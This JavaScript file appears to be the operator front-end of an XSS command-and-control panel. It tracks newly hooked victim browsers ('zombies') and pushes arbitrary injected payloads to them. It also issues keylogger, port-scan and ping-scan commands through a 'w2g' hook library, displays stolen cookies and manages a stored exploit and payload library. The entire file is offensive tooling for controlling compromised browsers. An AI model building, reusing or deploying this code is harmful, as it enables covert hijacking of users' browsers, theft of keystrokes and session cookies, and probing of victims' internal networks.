function refresh(path){
	if(path&&typeof(path)=='string'){location.href = "/"+path;}else{
		location.reload();
	}
}

$(document).ready(function(){
	$('li.mainlevel').mousemove(function(){
		$(this).find('ul').slideDown();//you can give it a speed
	});
	$('li.mainlevel').mouseleave(function(){
		$(this).find('ul').slideUp("fast");
	});
	$("#tabs ul").idTabs();
	
	$(".w_table tr").mouseover(function(){
		tr_css = $(this).css('background-color');
		$(this).css({'background-color':'#D5DFEC'});
	})
	$(".w_table tr").mouseout(function(){
		if(tr_css){
			$(this).css('background-color',tr_css);
		}
	})


	function sys_tip(content,delay,refresh_path){
		$('#sys_tip').text(content);
		$('#sys_tip').css('display','block');
		if(delay){
			setTimeout("$('#sys_tip').css('display','none')",delay);
		}
		if(refresh_path){
			setTimeout("refresh('"+refresh_path+"')",delay);
		}
	}


	/*zombies上线提醒机制*/
	function sys_tip_zombies(num) {
		var opts = {
			// pnotify_title: "提醒",
			pnotify_text: "发现新的zombies（<a href='/cc/'>"+num+"个</a>）上线",
			pnotify_hide: !0,
			pnotify_delay: 2e3,
			pnotify_addclass: "pnotify-modify",
			pnotify_stack:{dir1: "up", dir2: "left", "firstpos1": 15, "firstpos2": 15}
		};
		opts.pnotify_type = "notice";
		$.pnotify(opts);
		setTimeout(function(){
			window.location.reload()
		}, 3e3);
	}

	//sys_tip_zombies(3);
	var zombies_count = 0;
	var zombies_tip_handle = undefined;
	/* @wzg */
	setInterval(function(){
		$.get("/cc/lastest_zombies/", {}, function (data, textStatus){
			console.log(data);
			if(data.count){
				if(data.count != zombies_count){
					if(zombies_tip_handle) zombies_tip_handle.pnotify_remove();
					zombies_tip_handle = sys_tip_zombies(data.count);
					zombies_count = data.count;
				}
			}
		},"json");
	},1000);

	//--------------------------------//
	//cc
	//--------------------------------//
	// show/hide injxss_box
	$('#injxss_a').click(function(){
		$('#tabs').slideToggle(500,function(){
			if($('#tabs').css('display')=="none"){
				$('#injxss_a').html($('#injxss_a').html().replace('-','+'));
			}else{
				$('#injxss_a').html($('#injxss_a').html().replace('+','-'));
			}
		});
		return false;
	})

	$('#zombie_a').click(function(){
		$('#zombie_box').slideToggle(500,function(){
			if($('#zombie_box').css('display')=="none"){
				$('#zombie_a').html($('#zombie_a').html().replace('-','+'));
			}else{
				$('#zombie_a').html($('#zombie_a').html().replace('+','-'));
			}
		});
		return false;
	})

	/* @wzg choice system codz
		$('#injxss_codz_select').change(function(){
			var codz_id = $('#injxss_codz_select').attr('value');
			var codz_value = $('#_'+codz_id+'_value').attr('value');
			var codz_desc = $('#_'+codz_id+'_desc').attr('value');
			$('#injxss_codz_value').attr('value',codz_value);
			$('#injxss_codz_help').html(codz_desc);

		});
	*/
	$('#injxss_codz_select').change(function(){
		var codz_id = $('#injxss_codz_select').val();
		var codz_value = $('#_'+codz_id+'_value').val();
		var codz_desc = $('#_'+codz_id+'_desc').val();
		$('#injxss_codz_value').val(codz_value);
		$('#injxss_codz_help').html(codz_desc);

	});
	$('#injxss_codz_value_ok').click(function(){
		var pre_text = $('#injxss_textarea').val();
		var codz = $('#injxss_codz_value').val();
		if(!codz){return;}
		if(!pre_text){var end_text=codz;}
		else{
			var end_text = pre_text+'\n'+codz;
		}
		$('#injxss_textarea').val(end_text);
	});
	$('#injxss_codz_value_clean').click(function(){
		$('#injxss_codz_value').val('');
		$('#injxss_codz_help').html('');
	});

	$('#all_zombie_check').click(
		function(){
			if(this.checked){
				$("input[id^='zombie_check']").each(function(){this.checked=true;});
			}else{
				$("input[id^='zombie_check']").each(function(){this.checked=false;});
			}
		}
	);

	// inject xss codz... @wzg
	$('#injxss_submit').click(function(){
		// var exp = $('#injxss_textarea').attr('value');
		var exp = $('#injxss_textarea').val();
		injxss(exp);
	});
	$('#injxss_clean').click(function(){
		// $('#injxss_textarea').attr('value','');
		$('#injxss_textarea').val('');
	});
	$('#key_execute').click(function(){
		var exp = 'w2g.hijack.keylog("'+$('#key_dom').attr('value')+'");';
		injxss(exp);
	});
	$('#port_execute').click(function(){
		var host = $('#port_host').prop('value');
		var port = $('#port_range').prop('value');
		var timeout = $('#port_timeout').prop('value');
		var exp = 'w2g.net.portscan("'+host+'","'+port+'","'+timeout+'","");';
		injxss(exp);
	});
	$('#ping_execute').click(function(){
		var host_range = $('#ping_range').prop('value');
		var timeout = $('#ping_timeout').prop('value');
		var exp = 'w2g.net.pingscan("'+host_range+'","'+timeout+'","");';
		injxss(exp);
	});

	function injxss(exp){
		var start_time = $('#injxss_time_input').attr('value');

		if($('#all_zombie_check').attr('checked')){
			var all_zombie_check = 1;
		}else{var all_zombie_check = 0;}
		var zombie_array = $("input[id^='zombie_check']");
		var zombie_ids = '';
		for(i=0;i<zombie_array.length;i++){
			if(zombie_array[i].type=='checkbox' && zombie_array[i].checked){
				if(zombie_ids==''){zombie_ids = $('#'+zombie_array[i].id).attr("value");}
				else{zombie_ids += ',' + $('#'+zombie_array[i].id).attr("value");}
			}
		}
		// AJAX POST require token- -!!
		var token = $("[name='csrfmiddlewaretoken']").attr('value');
		$.ajax({
			type:"post",
			url:"/cc/injxss/",
			data:{'exp':exp,'all_zombie_check':all_zombie_check,'zombie_ids':zombie_ids,'start_time':start_time,'csrfmiddlewaretoken':token},
			success: function(data, text_status){
				$("input[id^='zombie_check']").each(function(){this.checked=false;});
				sys_tip(data.info,3000);
			},
			error: function(){
				alert(/ajax error/);
			}
		});
	}

	//--------------------------------//
	//codz
	//--------------------------------//
	$('#addcodz_a').click(function(){
		$('#addcodz_box').slideToggle(500,function(){
			if($('#addcodz_box').css('display')=="none"){
				$('#addcodz_a').html($('#addcodz_a').html().replace('-','+'));
			}else{
				$('#addcodz_a').html($('#addcodz_a').html().replace('+','-'));
			}
		});
		return false;
	})

	$('#addcodz_type').change(function(){
		var addcodz_type = $('#addcodz_type').attr('value');
		if(addcodz_type=="system"){
			sys_tip("类型选择了system，Codz值将从w2g.js中自动获取...",5000);
			$('#codz_textarea').attr('value','-');
			$('#codz_textarea').attr('disabled',true);
		}else{
			$('#codz_textarea').attr('disabled',false);
		}
		
	})
	$('#addcodz_clean').click(function(){
		/* @wzg */
		// $("#codz_textarea").attr("value","");
		// $("#desc_textarea").attr("value","");
		// $("#addcodz_key").attr("value","");
		// $("#addcodz_key").attr("disabled",false);
		// $("#addcodz_type").attr("value","exploit");
		// $("#addcodz_cate").attr("value","");
		// $("#addcodz_author").attr("value","");
		// $("#action").attr("value","");

		$("#codz_textarea").val("");
		$("#desc_textarea").val("");
		$("#addcodz_key").val("");
		$("#addcodz_key").attr("disabled",false);
		$("#addcodz_type").val("exploit");
		$("#addcodz_cate").val("");
		$("#addcodz_author").val("");
		// $("#action").val("");
	});
	//addcodz...
	$('#addcodz_submit').click(addcodz);
	function addcodz(){
		var codz = $('#codz_textarea').val();
		var desc = $('#desc_textarea').val();
		var action = $('#action').val();
		var addcodz_key = $('#addcodz_key').val();
		var addcodz_type = $('#addcodz_type').val();
		var addcodz_cate = $('#addcodz_cate').val();
		var addcodz_author = $('#addcodz_author').val();
		// AJAX POST require token- -!!
		var token = $("[name='csrfmiddlewaretoken']").val();
		$.ajax({
			type:"post",
			url:"/codz/add/",
			data:{'codz':codz,'desc':desc,'action':action,'key':addcodz_key,'type':addcodz_type,'catelog':addcodz_cate,'author':addcodz_author,'csrfmiddlewaretoken':token},
			success: function(data, text_status){
				if(data.success == '0'){
					sys_tip(data.info,3000);
				}else{
					sys_tip(data.info,2000,'codz');
				}
			},
			error: function(){
				alert(/ajax error/);
			}
		});
	}
	//editcodz...
	$(".codz_edit").click(function(){
		var $me = $(this);
		var id = $me.data('id');
		$.get("/codz/edit/", {action:"show",id:id}, function (data, textStatus){
			$me.parents('.tab-pane').find('.collapse').collapse('show');
			$("#codz_textarea").val(data.codz);
			$("#desc_textarea").val(data.desc);
			$("#addcodz_key").val(data.key);
			$("#addcodz_key").attr("disabled",true);
			$("#addcodz_type").val(data.type);
			$("#addcodz_cate").val(data.catelog);
			$("#addcodz_author").val(data.author);
			$("body").scrollTop(0);
		},"json");
		$("#action").val("edit");
	})
	
	/*
	$.each($('tr'),function(i,obj){
		if(i!=0){
			if(obj.cells[2].title=='system'){
				func = obj.cells[1].childNodes[0].innerHTML;
				obj.cells[3].innerHTML = eval(func);
			}
		}
	})*/
	
	// @wzg
	if($('#xssmisc_textarea').length>0){
		$.get("/payloads/lib/xssmisc.txt", function(data){
			$('#xssmisc_textarea').val(data);
		});
	}
	

	//--------------------------------//
	//http
	//--------------------------------//
	$("#hv_execute").click(http_request);
	function http_request(){
		var url = $("#hv_url").val();
		var method = $("#hv_method").val();
		var req_headers = $("#hv_req_headers").val();
		var postdata = $("#hv_postdata").val();
		// AJAX POST require token- -!!
		var token = $("[name='csrfmiddlewaretoken']").val();
		sys_tip("正在请求……");
		$.ajax({
			type:"post",
			url:"/http/view/request",
			data:{'url':url,'method':method,'req_headers':req_headers,'postdata':postdata,'csrfmiddlewaretoken':token},
			success: function(data, text_status){
				sys_tip(data.info,3000);
				$("#hv_response").val(data.httphead+"\n-------\n"+data.httpbody);
			},
			error: function(){
				alert(/ajax error/);
				$('#sys_tip').css('display','none');
			}
		});
	}
	
	var $select_method = $('#hv_method');
	$select_method.change(function() {
		if($select_method.val() == 'post') {
			$('#hv_postdata').attr('disabled',false);
		} else {
			$('#hv_postdata').attr('disabled',true);
		}
	});
	if($select_method.val() == 'post') {
		$('#hv_postdata').attr('disabled',false);
	} else {
		$('#hv_postdata').attr('disabled',true);
	}	

	$('#regx_select').change(function(){
		// var value = $('#regx_select').attr('value');
		// $('#regx_textarea').attr('value',unescape(value));
		var value = $('#regx_select').val();
		$('#regx_textarea').val(unescape(value));
	});

	/* cc codz modal */
    $(document).on('click','[data-action=modalBtn]',function(){
        var $me = $(this);
        var type = $me.data('type');
        var $modal = $('#J-modal');
        var $modalDialog = $modal.find('.modal-dialog');
        var $modalTit = $modal.find('.modal-title');
        var $modalFooter = $modal.find('.modal-footer');
        var $modalContent = $modal.find('.modal-body');
        var $modalComfirmBtn = $modal.find('#J-confirm');
        var modalObj;
        if(type == 'showDetail'){
            $modalDialog.removeClass('modal-sm');
            $modalTit.html('详细内容');
            $.ajax({
            	url:'/codz/detail?id=' + $me.data('id'),
            	type:'get',
            	success:function(data){
            		$modalContent.html('<div class="well" style="word-break:break-all"' + data + '</div>');
            		$('#J-modal').modal('show');
            	}
            })
        }else if(type == 'showCookie'){
            var cookieContent = $me.data('cookie');
            $modalDialog.removeClass('modal-sm');
            $modalTit.html('cookie内容');
            $modalContent.css('min-height',240).html(cookieContent);
            modalObj = $('#J-modal').modal('show');
            modalObj.on('shown.bs.modal',function(){
                // Center modal
            });
        }else if(type == 'del'){
            $modalTit.html('消息');
            $modalDialog.addClass('modal-sm');
            $modalContent.css('min-height','inherit').html('<p>确定要 <span class="text-danger">删除</span> 这条信息嘛?</p>');
            $modalFooter.removeClass('hidden');
            modalObj = $('#J-modal').modal('show');
            modalObj.on('hidden.bs.modal',function(){
                $modalDialog.removeClass('modal-sm');
                $modalFooter.addClass('hidden');
            });

            $modalComfirmBtn.off().on('click',function(){
            	var id = $me.data('id');
                $.get("/codz/del/", {Action:"get",ids:id}, function (data, textStatus){
					sys_tip('删除成功',3e3,'codz');
					$me.parents('tr').remove();
					$('#J-modal').modal('hide');
				});
            });
        }else if(type == 'delzombie'){
            $modalTit.html('消息');
            $modalDialog.addClass('modal-sm');
            $modalContent.css('min-height','inherit').html('<p>确定要 <span class="text-danger">删除</span> 这条信息嘛?</p>');
            $modalFooter.removeClass('hidden');
            modalObj = $('#J-modal').modal('show');
            modalObj.on('hidden.bs.modal',function(){
                $modalDialog.removeClass('modal-sm');
                $modalFooter.addClass('hidden');
            });

            $modalComfirmBtn.off().on('click',function(){
            	var id = $me.data('id');
                $.get("/cc/delzombie", {Action:"get",ids:id}, function (data, textStatus){
					sys_tip('删除成功',3e3,'cc');
					$me.parents('tr').prev().prev().remove();
					$me.parents('tr').prev().remove();
					$me.parents('tr').remove();
					$('#J-modal').modal('hide');
				});
            });
        }else if(type == 'input'){
            $modalTit.html('编辑备注');
            $modalDialog.removeClass('modal-sm');
            $modalContent.html('<textarea class="form-control" placeholder="备注信息">' + $me.data('desc') + '</textarea><p class="alert alert-danger hidden"></p>');
            $modalFooter.removeClass('hidden');
            modalObj = $('#J-modal').modal('show');
            modalObj.on('hidden.bs.modal',function(){
                $modalDialog.removeClass('modal-sm');
                $modalFooter.addClass('hidden');
            });

            $modalComfirmBtn.off().on('click',function(){
                var $input = $modal.find('textarea');
                var token = $("[name='csrfmiddlewaretoken']").attr('value');
                var val = String.prototype.trim.call($input.val())
                var $error = $modal.find('.alert');
                if(val == ''){
                    $error.html('备注信息不能为空').removeClass('hidden');
                    $input.focus();
                    setTimeout(function(){
                        $error.addClass('hidden');
                    },3e3);
                    return !1;
                }
				$.ajax({
					type:"post",
					url:"/cc/desczombie/",
					data:{
						'desc':val,
						'id':$me.data('id'),
						'csrfmiddlewaretoken':token
					},
					success: function(data, text_status){
						$('#J-modal').modal('hide');
						sys_tip(data.info,3000,'cc');
					},
					error: function(){
						alert(/ajax error/);
					}
				});
            });
        }
    });

	// 删除选中 codz list
	$(document).on('click','#J-batch-del',function(){
		var $me = $(this);
        var $modal = $('#J-modal');
        var $modalDialog = $modal.find('.modal-dialog');
        var $modalTit = $modal.find('.modal-title');
        var $modalFooter = $modal.find('.modal-footer');
        var $modalContent = $modal.find('.modal-body');
        var $modalComfirmBtn = $modal.find('#J-confirm');
        var modalObj;
        var $codzSelectedInput = $('#J-codzlist table input:checked');
		if(!$codzSelectedInput.size()){
			sys_tip('请选择项目',3e3);
			return !1;
		}

        $modalTit.html('消息');
        $modalDialog.addClass('modal-sm');
        $modalContent.css('min-height','inherit').html('<p>确定要 <span class="text-danger">删除</span> 这些项目嘛?</p>');
        $modalFooter.removeClass('hidden');
        modalObj = $('#J-modal').modal('show');
        modalObj.on('hidden.bs.modal',function(){
            $modalDialog.removeClass('modal-sm');
            $modalFooter.addClass('hidden');
        });

        $modalComfirmBtn.off().on('click',function(){
        	var id = [];
        	$.each($codzSelectedInput,function(index,item){
        		id.push($(item).val());
        	})
        	id = id.join(',');
            $.get("/codz/del/", {Action:"get",ids:id}, function (data, textStatus){
				sys_tip('删除成功',3e3,'codz');
				$codzSelectedInput.parents('tr').remove();
				$('#J-modal').modal('hide');
			});
        });
	});

	// 全选 codz list
	$(document).on('click','#all_codz_check',function(e){
		var $me = $(this);
		var $inputArr = $("#J-codzlist table tbody input");
		if(this.checked){
			$inputArr.each(function(){
				this.checked = !0;
			});
		}else{
			$inputArr.each(function(){
				this.checked = !1;
			});
		}
	});


});

function sleep(n){ /*毫秒*/   
	var start = new Date().getTime();     
	while(true) if(new Date().getTime()-start>n) break;     
}
